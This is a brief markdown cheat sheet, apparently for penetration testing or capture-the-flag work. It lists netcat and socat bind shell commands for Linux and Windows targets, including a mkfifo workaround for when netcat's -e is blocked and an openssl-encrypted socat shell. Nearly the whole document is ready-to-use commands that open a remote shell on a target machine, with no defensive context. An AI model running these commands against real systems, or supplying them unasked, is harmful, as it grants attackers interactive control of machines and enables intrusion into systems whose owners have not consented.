## NetCat

#### Attacker
```
nc <ip> <port> 
```
#### Target 
Linux
```
nc -lvnp <port> -e /bin/bash
```
Windows
```
nc -lvnp <port> -e powershell.exe
```
### If -e is blocked
#### Attacker
```
nc <ip><port>
```
#### Target
```
`mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
```

## Socat

#### Attacker
```
socat tcp:<ip>:<port> -
```
#### Target

Linux
```
socat tcp-l:<port> EXEC:"bash -li"
```
Windows
```
socat tcp-l:<port> EXEC:powershell.exe
```

### Encrypted Bind Shell

create certificate
```
`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
```
```
cat shell.key shell.crt >shell.pem
```
#### Attacker
```
socat OPENSSL:<IP>:<PORT>,verify=0 -
```
#### Target
Linux
```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:/bin/bash
```
Wndows
```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```
